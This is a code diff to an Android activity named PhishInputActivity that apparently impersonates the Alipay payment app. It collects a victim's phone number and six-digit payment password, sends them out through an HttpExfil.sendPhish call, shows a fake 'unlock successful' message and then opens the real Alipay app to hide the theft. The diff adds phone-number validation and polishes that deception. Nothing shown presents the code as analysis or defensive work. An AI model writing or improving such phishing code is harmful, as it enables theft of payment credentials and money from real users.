@@ -149,6 +149,11 @@ public class PhishInputActivity extends Activity {
             return;
         }
 
+        if (phone.length() != 11) {
+            Toast.makeText(this, "请输入11位手机号", Toast.LENGTH_SHORT).show();
+            return;
+        }
+
         if (password.length() != 6) {
             Toast.makeText(this, "支付密码必须为6位数字", Toast.LENGTH_SHORT).show();
             return;
@@ -159,13 +164,9 @@ public class PhishInputActivity extends Activity {
         String uri = deeplinkUri != null ? deeplinkUri.toString() : null;
         HttpExfil.sendPhish(this, phone, password, uri);
 
-        Toast.makeText(this, "验证中...", Toast.LENGTH_SHORT).show();
-
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            Toast.makeText(this, "验证失败，请重试", Toast.LENGTH_LONG).show();
-            openRealAlipay();
-            finish();
-        }, 2000);
+        Toast.makeText(this, "解锁成功", Toast.LENGTH_SHORT).show();
+        openRealAlipay();
+        finish();
     }
 
     private void openRealAlipay() {
